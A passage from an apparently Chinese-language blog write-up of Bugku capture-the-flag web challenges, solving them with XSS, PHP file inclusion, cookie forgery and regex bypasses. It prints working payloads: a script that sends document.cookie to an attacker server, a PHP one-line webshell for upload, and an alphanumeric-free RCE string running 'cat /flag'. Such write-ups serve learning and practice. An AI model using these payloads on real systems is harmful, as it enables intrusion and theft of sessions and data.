KEYS */</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `<span class="keyword">user</span>` <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;011be4d65feac1a8&#x27;</span>);</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `user` ENABLE KEYS */</span>;</span><br></pre></td></tr></table></figure>

<p>底下的话就是登录的账号密码，</p>
<p>登录后看到了我刚刚传入的(括号，那我们返回去注入一下xss语句</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)\<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>登录后可以看到有弹窗</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126153642287.png" alt="image-20241126153642287"></p>
<p>那我们看一下admin的cookie中有没有flag</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241126155017757.png" alt="image-20241126155017757"></p>
<p>刚好admin的cookie里面就有flag，把前后的编码换成花括号就行了</p>
<h2 id="留言板1"><a href="#留言板1" class="headerlink" title="留言板1"></a>留言板1</h2><h3 id="xss"><a href="#xss" class="headerlink" title="#xss"></a>#xss</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&quot;<span class="link">http://</span>[<span class="string">ip</span>]/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现script,http被过滤,还有长度限制</p>
<p>不过好像我的服务器接收不到数据，也不知道为啥，应该是平台的环境问题</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="#文件包含"></a>#文件包含</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126160635726.png" alt="image-20241126160635726"></p>
<p>看到那个click就点了，第一眼感觉像是任意文件读取，但是单单的file&#x3D;index.php是没办法获取源代码的，我们需要用伪协议去读取源代码</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取源码代码</span><br><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/resource=xxx.php</span><br><span class="line"></span><br><span class="line">通常获取源代码时，伪协议将xxx.php当文件执行，</span><br><span class="line">使得很多信息往往不能直接显示在浏览器页面上，通常使用base64编码后再显示</span><br><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页面回显了base64编码</p>
<p>解码后得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag:flag&#123;f81f50efef059669689aa4c5b9831c7a&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不过我发现直接读flag也是可以读到了，?file&#x3D;&#x2F;flag直接就能拿到flag了</p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="#cookie伪造"></a>#cookie伪造</h3><p>题目提示是cookie欺骗，直接看cookie发现了一个flag，拿去提交发现是假的flag</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126161220352.png" alt="image-20241126161220352"></p>
<p>在url中有a2V5cy50eHQ&#x3D;，拿去解码发现是一个keys.txt，我们访问一下发现和刚刚的页面内容是一样的，猜测是这个网页访问了一个文本文档，然后我就试着访问一下flag.txt和flag.php发现什么都没有，我就猜测了一下index.php</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126162309858.png" alt="image-20241126162309858"></p>
<p>修改了line发现有不同的内容，后面访问了n个line后才拿到完整的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到源码就好做了，设置cookie里面的margin等于margin然后访问keys.php</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126163042405.png" alt="image-20241126163042405"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><h3 id="erge-函数漏洞"><a href="#erge-函数漏洞" class="headerlink" title="erge()函数漏洞"></a>erge()函数漏洞</h3><p>在源码中发现了1p.html，但是访问了会跳转到bugku的官方，那我们抓包拦截一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126163517748.png" alt="image-20241126163517748"></p>
<p>发现了很多被注释掉的语句，这是多层解码</p>
<p>第一层</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164155012.png" alt="image-20241126164155012"></p>
<p>第二层</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164215358.png" alt="image-20241126164215358"></p>
<p>第三层</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164233124.png" alt="image-20241126164233124"></p>
<p>最后得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>条件</strong></p>
<ul>
<li><strong>变量 $id 弱等于整型数 0</strong></li>
<li><strong>变量 $b 的长度大于 5</strong></li>
<li><strong>字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配</strong></li>
<li><strong>变量 $b 的第一个字符弱不等于整型数 4</strong></li>
<li><strong>变量 $data 弱等于字符串 bugku is a nice plateform!</strong></li>
</ul>
<p><code>reg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p>
<p>绕过file_get_contents()函数用前面的方法就行，所以我们用伪协议去做</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126165219445.png" alt="image-20241126165219445"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p><img src="/./../image/achieve/202411/BUGKU/image-20241127122221343.png" alt="image-20241127122221343"></p>
<p>和前面的一样，有?file&#x3D;的格式，在源码中发现了upload.php，访问发现是一个上传文件的页面</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241127122335565.png" alt="image-20241127122335565"></p>
<p>经过测试发现这里对content头和后缀名进行了验证，然后也过滤了<code>&lt;?php 和?&gt;</code>,这样的话我们就只能换成phtml的马去做了</p>
<h3 id="方法一-一句话木马-蚁剑连马"><a href="#方法一-一句话木马-蚁剑连马" class="headerlink" title="方法一:一句话木马+蚁剑连马"></a>方法一:一句话木马+蚁剑连马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[cmd])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后修改文件后缀和content-type头</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128155958367.png" alt="image-20241128155958367"></p>
<p>看见上传成功了，我们访问一下这个<a target="_blank" rel="noopener" href="http://114.67.175.224:11279/index.php?file=upload/202411280758367957.jpg">http://114.67.175.224:11279/index.php?file=upload/202411280758367957.jpg</a></p>
<p>访问成功后用蚁剑连接就可以了</p>
<h3 id="方法二：rce"><a href="#方法二：rce" class="headerlink" title="方法二：rce"></a>方法二：rce</h3><p>我没做记录，所以直接拿的别的师傅的讲一下</p>
<p>新建一个txt文件写入<code> \&lt;script language=php&gt;system(&quot;ls&quot;)\&lt;/script&gt;</code> 后另存为 jpg 格式进行上传</p>
<p>上传成功后访问文件可以得到我们页面的文件目录</p>
<p><img src="/./../image/achieve/202411/BUGKU/3e1c733f53829f722a89291b2a924c09.png" alt="img"></p>
<p>然后访问：<a target="_blank" rel="noopener" href="http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt">http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt</a></p>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><h3 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="#无数字字母RCE"></a>#无数字字母RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt;= <span class="number">105</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Hacked!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You need to pass in a string&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;long?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到正则匹配直接用脚本把能用的字符输出出来看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&#x27;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;<span class="comment">#替换题目中的正则表达式就行</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#输出! $ &#x27; ( ) + , . / ; = [ ] _ </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就是很经典的无字母数字rce了，可以用自增，异或，取反进行rce</p>
<p>我这里用自增进行rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[_];</span><br><span class="line"><span class="comment">#var_dump($_); # 输出N</span></span><br><span class="line"><span class="variable">$_</span>++; </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#var_dump($_); # 输出_POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br><span class="line"><span class="comment">#也就是 $_POST[_]($_POST[__])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解释如下：</p>
<ul>
<li>$_POST 变量用来收集表单数据，</li>
<li>这里$_POST[_] ($_POST[__]),就是要给_和__进行传参，（）的意思应该是分传参的先后次序咯。</li>
</ul>
<p>最后的payload就是</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="keyword">system</span>&amp;__=cat /flag&amp;code=%24_%3D(_%2F_._)%5B_%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24__.%24_%3B%24_%2B%2B%3B%24__%3D%24__.%24_%3B%24_%3D_.%24__%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241128163337774.png" alt="image-20241128163337774"></p>
<h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><h3 id="php特性"><a href="#php特性" class="headerlink" title="#php特性"></a>#php特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="variable">$first</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有三层验证，我们逐个进行分析</p>
<p>第一层，将我们传入的zero和first两个参数拼接然后进行正则匹配，所以我们两个参数中只要有一个参数包含里面其中一个就可以了</p>
<p>第二层，将我们的second变量赋值给key然后进行正则匹配，如果key中有..或者flag就会执行die函数</p>
<p>第三层，</p>
<p>\056  为八进制  代表  句点或小数点</p>
<p>\160  为八进制  代表  小写字母 p</p>
<p>\150  为八进制  代表  小写字母 h</p>
<p>\x70  为十六进制 代表  小写字母 p</p>
<p>对first参数进行正则匹配，如果参数中包含|.php才能通过验证</p>
<p>最后会对zero进行base64解码，因为是highlight_file()函数，所以我们的zero.end应该是flag.php的文件名</p>
<p>所以我们的payload</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">first</span>=aaaa|<span class="type">.php</span>&amp;zero=ZmxhZw==</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241128170957161.png" alt="image-20241128170957161"></p>
<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><h3 id="php特性-1"><a href="#php特性-1" class="headerlink" title="#php特性"></a>#php特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先解释一下这句代码</p>
<p><code>$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)\[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<ol>
<li><code>/</code>: 正则表达式的开始和结束标记。</li>
<li><code>key.*key</code>: 匹配以 <code>key</code> 开头和结尾，中间任意字符（<code>.*</code> 表示零个或多个任意字符）的子字符串。</li>
<li><code>.&#123;4,7&#125;</code>: 匹配任意字符（<code>.</code>）4到7次。</li>
<li><code>key:\/.\/</code>: 匹配 <code>key:/./</code> 这个子字符串。</li>
<li><code>(.*key)</code>: 匹配任意字符（<code>.*</code>）直到遇到 <code>key</code>，并将匹配的部分捕获到一个分组中。</li>
<li><code>[a-z]</code>: 匹配任意小写字母。</li>
<li><code>[[:punct:]]</code>: 匹配标点字符。</li>
<li><code>/i</code>: 表示不区分大小写进行匹配。</li>
<li>综合起来，这个正则表达式的大致含义是：匹配包含以下模式的字符串：<ul>
<li>以 <code>key</code> 开头，中间包含任意字符，以 <code>key</code> 结尾。</li>
<li>中间有 4 到 7 个任意字符。</li>
<li>包含特定字符串 <code>key:/./</code>。</li>
<li>捕获从上一个 <code>key</code> 到下一个 <code>key</code> 之间的任意字符序列。</li>
<li>之后是一个小写字母和一个标点字符。</li>
</ul>
</li>
</ol>
<p>在这行代码中，<code>preg_match</code> 函数将检查 <code>$_GET[&quot;id&quot;]</code> 中的内容是否符合上述正则表达式的模式。如果匹配成功，则返回值 <code>$IM</code> 为 1，匹配的结果会存储在数组 <code>$match</code> 中。如果匹配失败，则返回值为 0。</p>
<p>所以我们这里的话是需要匹配结果为1才能执行if语句拿到flag</p>
<p>那我们顺着他的匹配去就行</p>
<p>payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=key1234keyaaaakey:/./akeyx.</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241128172752782.png" alt="image-20241128172752782"></p>
<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><h3 id="python代码执行"><a href="#python代码执行" class="headerlink" title="#python代码执行"></a>#python代码执行</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241128172945377.png" alt="image-20241128172945377"></p>
<p>需要的是python的文件执行命令</p>
